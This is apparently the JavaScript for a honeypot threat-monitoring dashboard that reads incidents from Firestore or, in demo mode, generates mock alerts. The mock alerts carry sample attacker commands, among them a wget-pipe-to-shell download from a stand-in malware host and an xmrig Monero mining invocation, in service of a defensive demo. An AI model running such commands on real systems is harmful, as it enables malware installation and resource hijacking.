import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, collection, query, orderBy, limit, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// Helper for Eastern Time (ET) Clock
function updateClock() {
  const clock = document.getElementById("utc-clock");
  if (clock) {
    const now = new Date();
    const options = { timeZone: "America/New_York", year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false };
    const formatter = new Intl.DateTimeFormat("en-US", options);
    const parts = formatter.formatToParts(now);
    const year = parts.find(p => p.type === 'year').value;
    const month = parts.find(p => p.type === 'month').value;
    const day = parts.find(p => p.type === 'day').value;
    const hour = parts.find(p => p.type === 'hour').value;
    const minute = parts.find(p => p.type === 'minute').value;
    const second = parts.find(p => p.type === 'second').value;
    const tzName = now.toLocaleDateString("en-US", { timeZone: "America/New_York", timeZoneName: "short" }).split(" ").pop();
    clock.textContent = `${year}-${month}-${day} ${hour}:${minute}:${second} ${tzName}`;
  }
}
setInterval(updateClock, 1000);
updateClock();

// Default placeholder config
let firebaseConfig = {
  apiKey: "PLACEHOLDER_API_KEY",
  authDomain: "YOUR-PROJECT-ID.firebaseapp.com",
  projectId: "YOUR-PROJECT-ID",
  storageBucket: "YOUR-PROJECT-ID.appspot.com",
  messagingSenderId: "PLACEHOLDER_SENDER_ID",
  appId: "PLACEHOLDER_APP_ID"
};

// Check if user has provided configuration via window object (defined in firebase-config.js)
if (window.firebaseConfig) {
  firebaseConfig = window.firebaseConfig;
}

const isPlaceholder = firebaseConfig.projectId.includes("YOUR-PROJECT-ID");

const alertsContainer = document.getElementById("alerts-container");
const loader = document.getElementById("loader");

// DOM elements for stats
const statTotal = document.getElementById("stat-total");
const statCritical = document.getElementById("stat-critical");
const statTopIp = document.getElementById("stat-top-ip");
const statMitre = document.getElementById("stat-mitre");

// Modal Elements
const modal = document.getElementById("detail-modal");
const modalClose = document.getElementById("modal-close");
const modalSeverity = document.getElementById("modal-severity");
const modalSummary = document.getElementById("modal-summary");
const modalEventId = document.getElementById("modal-event-id");
const modalSrcIp = document.getElementById("modal-src-ip");
const modalTimestamp = document.getElementById("modal-timestamp");
const modalUser = document.getElementById("modal-user");
const modalPass = document.getElementById("modal-pass");
const modalCommand = document.getElementById("modal-command");
const modalVtMalicious = document.getElementById("modal-vt-malicious");
const modalVtReputation = document.getElementById("modal-vt-reputation");
const modalVtAsn = document.getElementById("modal-vt-asn");
const modalVtOwner = document.getElementById("modal-vt-owner");
const modalVtCountry = document.getElementById("modal-vt-country");
const modalPlaybook = document.getElementById("modal-playbook");
const modalMitreTags = document.getElementById("modal-mitre-tags");

// Local cache of loaded incidents for modal lookup
let incidentCache = {};

const mockTemplates = [
  {
    title: "SSH Brute Force Botnet",
    severity: "LOW",
    summary: "Repeated failed login connections detected on honeypot port 22. Multiple root accounts targeted.",
    src_ip: "185.220.101.5",
    user: "root",
    pass: "admin123",
    command: "None (Auth rejected)",
    mitre_attack: ["T1110.001 - Brute Force"],
    vt_lookup: { malicious_score: 0, reputation: -2, asn: "AS1234 Tor Exit Relay", owner: "TorRelayNode", country: "DE" },
    playbook: "No action required. Host automatically blacklisted scanner IP under fail2ban security policy."
  },
  {
    title: "Malicious Reverse Shell Spawned",
    severity: "CRITICAL",
    summary: "Attacker authenticated using default credentials and attempted to download/execute backdoor payload.",
    src_ip: "91.191.209.124",
    user: "ubuntu",
    pass: "ubuntu@123",
    command: "wget http://mirai-network.biz/payload.sh -O - | sh",
    mitre_attack: ["T1059.004 - Unix Shell", "T1105 - Ingress Tool Transfer"],
    vt_lookup: { malicious_score: 48, reputation: -92, asn: "AS4321 Bulletproof Host Corp", owner: "DigitalShade ISP", country: "RU" },
    playbook: "CRITICAL ALERT: Target VM isolated dynamically. Firewall blocking rule generated for attacker IP."
  },
  {
    title: "SFTP Malware Payload Upload",
    severity: "HIGH",
    summary: "Uploaded suspicious ELF executable binary inside /tmp directory via SFTP session.",
    src_ip: "45.143.203.14",
    user: "support",
    pass: "supportPass!",
    command: "sftp upload: /tmp/cryptominer.x86",
    mitre_attack: ["T1204.002 - Malicious File", "T1105 - Ingress Tool Transfer"],
    vt_lookup: { malicious_score: 56, reputation: -115, asn: "AS6677 Botnet Server Node", owner: "LocalNet LLC", country: "CN" },
    playbook: "HIGH ALERT: Malicious binary purged from disk. Credentials disabled. Attacker IP blacklisted."
  },
  {
    title: "CPU Resource Hijacking (Monero)",
    severity: "CRITICAL",
    summary: "Monero miner daemon execution detected inside background tasks. System CPU spiked to 100%.",
    src_ip: "198.51.100.72",
    user: "admin",
    pass: "AdminP@ss1",
    command: "./xmrig -o pool.minexmr.com -u xmr_wallet --cpu-max-threads-hint=100",
    mitre_attack: ["T1496 - Resource Hijacking"],
    vt_lookup: { malicious_score: 15, reputation: -12, asn: "AS8899 VPS Hosting Corp", owner: "CloudHost Inc", country: "US" },
    playbook: "CRITICAL ALERT: Miner process killed. Temp scripts deleted. IAM instance keys rotated immediately."
  }
];

if (isPlaceholder) {
  // Hide loader
  loader.style.display = "none";

  // Create Demo Mode Notice Banner
  const banner = document.createElement("div");
  banner.style = "background: rgba(10, 132, 255, 0.1); border: 1px solid rgba(10, 132, 255, 0.2); color: #0a84ff; padding: 0.75rem 1rem; border-radius: 8px; font-size: 0.8rem; margin-bottom: 1.5rem; display: flex; align-items: center; justify-content: space-between; grid-column: span 3;";
  banner.innerHTML = `
    <span><i class="fa-solid fa-circle-info"></i> Running in <strong>Demo Mode (Mock Telemetry Feed)</strong>. Connect Firestore in <code>firebase-config.js</code> to link live GCP.</span>
    <button onclick="this.parentElement.remove()" style="background: none; border: none; color: #0a84ff; cursor: pointer; font-size: 1rem;"><i class="fa-solid fa-times"></i></button>
  `;
  alertsContainer.parentElement.insertBefore(banner, alertsContainer);

  let totalMockAlerts = 0;
  let criticalMockAlerts = 0;
  const ipCounts = {};
  const mitreCounts = {};

  function triggerMockAlert() {
    const template = mockTemplates[Math.floor(Math.random() * mockTemplates.length)];
    const mockId = "mock-" + Math.random().toString(36).substring(2, 9);
    
    // Randomize suffix of IP for variety
    const suffix = Math.floor(Math.random() * 254) + 1;
    const ipParts = template.src_ip.split(".");
    ipParts[3] = suffix.toString();
    const randomizedIp = ipParts.join(".");
    
    const incident = {
      timestamp: new Date().toISOString(),
      src_ip: randomizedIp,
      user: template.user,
      password: template.password,
      command: template.command,
      ai_analysis: {
        severity: template.severity,
        summary: template.summary,
        mitre_attack: template.mitre_attack,
        vt_lookup: {
          malicious_score: template.vt_lookup.malicious_score,
          reputation: template.vt_lookup.reputation,
          asn: template.vt_lookup.asn,
          owner: template.vt_lookup.owner,
          country: template.vt_lookup.country
        },
        playbook: template.playbook
      }
    };

    incidentCache[mockId] = incident;
    totalMockAlerts++;
    
    if (template.severity === "CRITICAL" || template.severity === "HIGH") {
      criticalMockAlerts++;
    }
    
    ipCounts[randomizedIp] = (ipCounts[randomizedIp] || 0) + 1;
    template.mitre_attack.forEach(t => {
      mitreCounts[t] = (mitreCounts[t] || 0) + 1;
    });

    // Update Stats
    statTotal.textContent = totalMockAlerts;
    statCritical.textContent = criticalMockAlerts;
    
    // Top IP
    let topIp = "--";
    let maxIpCount = 0;
    for (const [ip, count] of Object.entries(ipCounts)) {
      if (count > maxIpCount) {
        maxIpCount = count;
        topIp = ip;
      }
    }
    statTopIp.textContent = topIp;
    
    // Top MITRE
    let topMitre = "--";
    let maxMitreCount = 0;
    for (const [technique, count] of Object.entries(mitreCounts)) {
      if (count > maxMitreCount) {
        maxMitreCount = count;
        topMitre = technique.split(" - ")[0];
      }
    }
    statMitre.textContent = topMitre;

    // Render row (prepend to top)
    renderAlertRow(mockId, incident, true);
    
    // Limit to 25 rows in UI
    if (alertsContainer.children.length > 25) {
      alertsContainer.removeChild(alertsContainer.lastChild);
    }
  }

  // Pre-seed 6 alerts immediately
  for (let i = 0; i < 6; i++) {
    triggerMockAlert();
  }

  // Add one alert every 7 seconds
  setInterval(triggerMockAlert, 7000);

} else {
  // Initialize Firebase & Firestore
  try {
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    
    // Query incidents collection, ordered by timestamp descending, limit to 25
    const incidentsRef = collection(db, "incidents");
    const q = query(incidentsRef, orderBy("timestamp", "desc"), limit(25));
    
    // Subscribe to Firestore changes
    onSnapshot(q, (querySnapshot) => {
      loader.style.display = "none";
      
      // Clear container and cache
      alertsContainer.innerHTML = "";
      incidentCache = {};
      
      if (querySnapshot.empty) {
        alertsContainer.innerHTML = `
          <div class="loading-state">
            <i class="fa-solid fa-folder-open" style="font-size: 2.5rem; color: var(--text-muted);"></i>
            <p>Database connected. No incidents reported yet.</p>
          </div>
        `;
        return;
      }
      
      // Calculate Stats on client side based on snapshot
      let totalCount = querySnapshot.size;
      let criticalCount = 0;
      const ipCounts = {};
      const mitreCounts = {};
      
      querySnapshot.forEach((doc) => {
        const incident = doc.data();
        const docId = doc.id;
        incidentCache[docId] = incident;
        
        const severity = incident.ai_analysis?.severity?.toUpperCase() || "LOW";
        if (severity === "CRITICAL" || severity === "HIGH") {
          criticalCount++;
        }
        
        // Count IP frequencies
        const ip = incident.src_ip || "Unknown";
        ipCounts[ip] = (ipCounts[ip] || 0) + 1;
        
        // Count MITRE technique frequencies
        const mitreList = incident.ai_analysis?.mitre_attack || [];
        mitreList.forEach(t => {
          mitreCounts[t] = (mitreCounts[t] || 0) + 1;
        });
        
        // Render Alert Row
        renderAlertRow(docId, incident);
      });
      
      // Update UI Stats
      statTotal.textContent = totalCount;
      statCritical.textContent = criticalCount;
      
      // Top IP
      let topIp = "--";
      let maxIpCount = 0;
      for (const [ip, count] of Object.entries(ipCounts)) {
        if (count > maxIpCount && ip !== "0.0.0.0" && ip !== "Unknown") {
          maxIpCount = count;
          topIp = ip;
        }
      }
      statTopIp.textContent = topIp;
      
      // Top MITRE Technique
      let topMitre = "--";
      let maxMitreCount = 0;
      for (const [technique, count] of Object.entries(mitreCounts)) {
        if (count > maxMitreCount) {
          maxMitreCount = count;
          topMitre = technique.split(" - ")[0]; // Get the ID e.g. T1110
        }
      }
      statMitre.textContent = topMitre;
      
    }, (error) => {
      logger.error("Firestore snapshot error: ", error);
      loader.innerHTML = `
        <div style="color: var(--color-critical);">
          <i class="fa-solid fa-circle-exclamation" style="font-size: 2.5rem; margin-bottom: 0.5rem;"></i>
          <p>Failed to read from Firestore database. Check security rules and console logs.</p>
        </div>
      `;
    });
    
  } catch (err) {
    console.error("Firebase Init Error:", err);
    loader.innerHTML = `<p style="color: var(--color-critical);">Failed to initialize Firebase SDK. Verify config settings.</p>`;
  }
}

// Function to render an individual alert row in the list
function renderAlertRow(id, incident, prepend = false) {
  const row = document.createElement("div");
  row.className = "alert-row";
  row.dataset.id = id;
  
  const severity = incident.ai_analysis?.severity || "LOW";
  const severityClass = severity.toLowerCase();
  
  // Format Timestamp in Eastern Time (America/New_York)
  let formattedTime = "00:00:00";
  try {
    const rawTime = incident.timestamp;
    if (rawTime) {
      const dt = new Date(rawTime);
      formattedTime = dt.toLocaleTimeString("en-US", { timeZone: "America/New_York", hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" });
    }
  } catch (e) {
    console.error("Time format error:", e);
  }
  
  const ip = incident.src_ip || "0.0.0.0";
  const summary = incident.ai_analysis?.summary || "Incoming threat telemetry event.";
  
  row.innerHTML = `
    <span class="alert-severity-badge ${severityClass}">${severity}</span>
    <span class="alert-time">${formattedTime}</span>
    <span class="alert-ip">${ip}</span>
    <span class="alert-summary">${summary}</span>
    <span class="alert-action">Triage &rarr;</span>
  `;
  
  row.addEventListener("click", () => openModal(id));
  if (prepend) {
    alertsContainer.insertBefore(row, alertsContainer.firstChild);
  } else {
    alertsContainer.appendChild(row);
  }
}

// Modal management
function openModal(id) {
  const incident = incidentCache[id];
  if (!incident) return;
  
  const severity = incident.ai_analysis?.severity || "LOW";
  const severityClass = severity.toLowerCase();
  
  // Set Severity Badge
  modalSeverity.className = `severity-badge ${severityClass}`;
  modalSeverity.textContent = severity;
  
  // Populate Fields
  modalSummary.textContent = incident.ai_analysis?.summary || "No summary available.";
  modalEventId.textContent = incident.event_id || "cowrie.unknown";
  modalSrcIp.textContent = incident.src_ip || "0.0.0.0";
  
  // Pretty Date
  try {
    const dt = new Date(incident.timestamp);
    modalTimestamp.textContent = dt.toUTCString();
  } catch (e) {
    modalTimestamp.textContent = incident.timestamp || "--";
  }
  
  // Honeypot credentials and inputs
  const rawPayload = incident.raw_payload || {};
  modalUser.textContent = rawPayload.username || "--";
  modalPass.textContent = rawPayload.password || "--";
  modalCommand.textContent = rawPayload.input || rawPayload.command || "--";
  
  // VirusTotal Reputation
  const vt = incident.virustotal;
  if (vt) {
    modalVtMalicious.innerHTML = `<span style="color: ${vt.malicious > 0 ? 'var(--color-critical)' : 'inherit'}">${vt.malicious}</span> / ${vt.malicious + vt.suspicious + vt.harmless + vt.undetected}`;
    modalVtReputation.textContent = vt.reputation;
    modalVtAsn.textContent = vt.asn || "--";
    modalVtOwner.textContent = vt.as_owner || "--";
    modalVtCountry.textContent = vt.country || "--";
  } else {
    modalVtMalicious.textContent = "N/A";
    modalVtReputation.textContent = "N/A";
    modalVtAsn.textContent = "--";
    modalVtOwner.textContent = "--";
    modalVtCountry.textContent = "--";
  }
  
  // Playbook Recommendations
  modalPlaybook.textContent = incident.ai_analysis?.recommendations || "No recommendations provided.";
  
  // MITRE ATT&CK Tags
  modalMitreTags.innerHTML = "";
  const techniques = incident.ai_analysis?.mitre_attack || [];
  if (techniques.length > 0) {
    techniques.forEach(t => {
      const tag = document.createElement("span");
      tag.className = "mitre-tag";
      tag.textContent = t;
      modalMitreTags.appendChild(tag);
    });
  } else {
    const tag = document.createElement("span");
    tag.className = "mitre-tag";
    tag.textContent = "No technique mapped";
    modalMitreTags.appendChild(tag);
  }
  
  // Show Modal
  modal.classList.add("active");
}

// Modal event listeners
modalClose.addEventListener("click", () => {
  modal.classList.remove("active");
});

window.addEventListener("click", (e) => {
  if (e.target === modal) {
    modal.classList.remove("active");
  }
});

// Clear button logic
document.getElementById("btn-clear").addEventListener("click", () => {
  alertsContainer.innerHTML = `
    <div class="loading-state">
      <i class="fa-solid fa-circle-minus" style="font-size: 2.5rem; color: var(--text-muted);"></i>
      <p>Feed view cleared. Listening for incoming incidents...</p>
    </div>
  `;
});
